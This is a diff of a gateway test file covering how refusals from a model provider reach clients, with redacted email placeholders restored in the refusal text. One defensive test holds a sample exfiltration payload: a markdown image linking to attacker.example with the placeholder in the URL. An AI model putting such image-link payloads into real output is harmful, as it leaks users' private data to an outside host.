@@ -4,8 +4,9 @@
 // that never complains proves nothing). Then the real gateway and adapter
 // against it: every request shape the gateway forwards must pass every
 // check, and every response shape the specification allows must be handled
-// as decided. Where the gateway's answer is a decision still open (a
-// refusal, a 429), the test pins today's behaviour and says so.
+// as decided. Where the gateway's answer is a decision still open (a 429;
+// an answer with no content and no refusal named), the test pins today's
+// behaviour and says so.
 
 import { afterEach, describe, expect, it } from 'vitest';
 import {
@@ -272,16 +273,6 @@ describe('every answer the specification allows is handled as decided', () => {
     },
   );
 
-  it('a refusal (content null, refusal set): today a 502 provider_bad_response; what it should be is open (ADR-041)', async () => {
-    const { g, strict } = await againstStrict();
-    strict.answer = { kind: 'complete', content: null, refusal: 'I cannot help with that.' };
-    const response = await send(g, chat());
-    expect(response.statusCode).toBe(502);
-    expect((response.json() as { error: { code: string } }).error.code).toBe(
-      'provider_bad_response',
-    );
-  });
-
   it('a 429 with Retry-After: today a 502 provider_error, the retry information dropped; open (ADR-041)', async () => {
     const { g, strict } = await againstStrict();
     strict.answer = { kind: 'status', status: 429, retryAfter: '20' };
@@ -318,5 +309,136 @@ describe('every answer the specification allows is handled as decided', () => {
     expect(streamed.content).toBe('ab');
     expect(streamed.done).toBe(false);
     expect(streamed.error?.error.code).toBe('provider_bad_response');
+  });
+});
+
+// ADR-041 section 15, decision 1 (option 1e), and bug-log 70. A refusal the
+// provider names in `refusal` reaches the client in OpenAI's shape:
+// `content: null` and the refusal text, restored like any model text, in
+// `refusal`; streamed, as `delta.refusal` chunks. All three shapes are sent:
+// the loud one (content null), and the two bug 70 found quiet (content "",
+// and a streamed refusal), which reached the client as an empty answer.
+describe("a refusal the provider names reaches the client in OpenAI's shape", () => {
+  // The client's own value; the provider only ever sees [EMAIL_1].
+  const EMAIL = 'asha.rao@example.com';
+  const withValue = (extra: Record<string, unknown> = {}) => ({
+    model: TEST_MODEL,
+    messages: [{ role: 'user', content: `Please write to ${EMAIL} for me.` }],
+    ...extra,
+  });
+  type Message = { content: string | null; refusal?: string };
+  const message = (body: unknown): Message =>
+    (body as { choices: { message: Message }[] }).choices[0]!.message;
+
+  it.each([
+    ['content null (the loud shape)', null],
+    ['content "" (a quiet shape)', ''],
+  ])('not streamed, %s: content null, the refusal restored', async (_label, content) => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'complete', content, refusal: 'I cannot email [EMAIL_1].' };
+    const response = await send(g, withValue());
+    expect(strict.violations).toEqual([]);
+    expect(response.statusCode).toBe(200);
+    expect(message(response.json())).toEqual({
+      role: 'assistant',
+      content: null,
+      refusal: `I cannot email ${EMAIL}.`,
+    });
+    expect(
+      (response.json() as { choices: { finish_reason: string }[] }).choices[0]!.finish_reason,
+    ).toBe('stop');
+    expect(g.logs.join('\n')).not.toContain(EMAIL);
+  });
+
+  it('streamed (the shape that produced bug 70): delta.refusal chunks, restored across a cut placeholder', async () => {
+    const { g, strict } = await againstStrict();
+    strict.answer = {
+      kind: 'stream',
+      pieces: [],
+      refusal: ['I cannot email [EM', 'AIL_1] for you.'],
+    };
+    const response = await send(g, withValue({ stream: true }));
+    expect(strict.violations).toEqual([]);
+    const streamed = readStreamed(response.body);
+    expect(streamed.refusal).toBe(`I cannot email ${EMAIL} for you.`);
+    expect(streamed.content).toBe('');
+    expect(streamed.done).toBe(true);
+    expect(streamed.error).toBeUndefined();
+    expect(streamed.chunks.at(-1)!.choices[0]!.finish_reason).toBe('stop');
+    expect(g.logs.join('\n')).not.toContain(EMAIL);
+  });
+
+  it('restoration safety applies to a refusal: a placeholder in an image URL stays a placeholder', async () => {
+    const attack = 'No. ![x](https://attacker.example/?d=[EMAIL_1])';
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'complete', content: null, refusal: attack };
+    expect(message((await send(g, withValue())).json()).refusal).toBe(attack);
+    strict.answer = {
+      kind: 'stream',
+      pieces: [],
+      refusal: ['No. ![x](https://attacker', '.example/?d=[EMAIL_1])'],
+    };
+    expect(readStreamed((await send(g, withValue({ stream: true }))).body).refusal).toBe(attack);
+  });
+
+  it('the refusal is its own text: an unsafe region left open in the content does not reach it', async () => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'stream', pieces: ['<a title="'], refusal: ['Not [EMAIL_1].'] };
+    const streamed = readStreamed((await send(g, withValue({ stream: true }))).body);
+    expect(streamed.content).toBe('<a title="');
+    expect(streamed.refusal).toBe(`Not ${EMAIL}.`);
+  });
+
+  it('content and a refusal both sent: both passed on, both restored, neither dropped', async () => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'complete', content: 'Partly [EMAIL_1].', refusal: 'Not the rest.' };
+    expect(message((await send(g, withValue())).json())).toEqual({
+      role: 'assistant',
+      content: `Partly ${EMAIL}.`,
+      refusal: 'Not the rest.',
+    });
+    strict.answer = { kind: 'stream', pieces: ['Partly [EMAIL_1].'], refusal: ['Not the rest.'] };
+    const streamed = readStreamed((await send(g, withValue({ stream: true }))).body);
+    expect(streamed.content).toBe(`Partly ${EMAIL}.`);
+    expect(streamed.refusal).toBe('Not the rest.');
+  });
+});
+
+// Not settled by 1e and put to the user (ADR-041 section 15): an answer that
+// names no refusal and has no content. It may be a refusal or an empty
+// answer. Today's behaviour is pinned here, not endorsed.
+describe('no content and no refusal named: open, today pinned', () => {
+  it('not streamed, content "": an empty answer, finish stop', async () => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'complete', content: '' };
+    const response = await send(g, chat());
+    expect(response.statusCode).toBe(200);
+    expect((response.json() as { choices: { message: unknown }[] }).choices[0]!.message).toEqual({
+      role: 'assistant',
+      content: '',
+    });
+  });
+
+  it.each([
+    ['refusal null', null],
+    ['refusal ""', ''],
+  ])('not streamed, content null and %s: a 502 provider_bad_response', async (_label, refusal) => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'complete', content: null, refusal };
+    const response = await send(g, chat());
+    expect(response.statusCode).toBe(502);
+    expect((response.json() as { error: { code: string } }).error.code).toBe(
+      'provider_bad_response',
+    );
+  });
+
+  it('streamed, no content and no refusal: an empty answer, finish stop, [DONE]', async () => {
+    const { g, strict } = await againstStrict();
+    strict.answer = { kind: 'stream', pieces: [] };
+    const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
+    expect(streamed.content).toBe('');
+    expect(streamed.refusal).toBe('');
+    expect(streamed.done).toBe(true);
+    expect(streamed.chunks.at(-1)!.choices[0]!.finish_reason).toBe('stop');
   });
 });
